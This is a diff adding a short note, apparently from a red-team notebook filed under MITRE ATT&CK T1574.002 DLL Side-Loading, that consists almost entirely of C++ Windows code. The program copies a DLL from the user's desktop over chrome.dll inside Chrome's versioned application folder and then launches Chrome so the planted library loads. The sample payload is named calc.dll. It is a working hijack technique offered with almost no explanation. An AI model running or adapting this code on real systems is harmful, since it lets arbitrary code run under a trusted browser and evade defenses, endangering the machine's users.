@@ -1,0 +1,49 @@
+---
+title: ".002.DLL Side-Loading"
+folder: "07. Defense Evasion/T1574 Hijack Execution Flow"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void OpenChrome() {
+
+    wchar_t currentDirectory[MAX_PATH];
+    GetCurrentDirectoryW(MAX_PATH, currentDirectory);
+    std::wstring notepadPath = L"C:\\Programy\\Chrome\\Application\\chrome.exe";
+
+
+    if (ShellExecuteW(NULL, L"open", notepadPath.c_str(), NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {}
+}
+bool Copy1File() {
+    std::wstring destDir = L"C:\\Programy\\Chrome\\Application";
+
+
+    WIN32_FIND_DATAW findFileData;
+    HANDLE hFind = FindFirstFileW((destDir + L"\\1*").c_str(), &findFileData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    FindClose(hFind);
+    std::wstring srcPath = L"C:\\Users\\User\\Desktop\\calc.dll";
+    std::wstring destPath = destDir + L"\\" + findFileData.cFileName + L"\\chrome.dll";
+
+    if (!CopyFileW(srcPath.c_str(), destPath.c_str(), FALSE)) {
+        std::cerr << "Błąd podczas kopiowania pliku: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    std::wcout << L"Plik został pomyślnie skopiowany do " << destPath << std::endl;
+    return true;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    Copy1File();
+    OpenChrome();
+    return 0;
+}
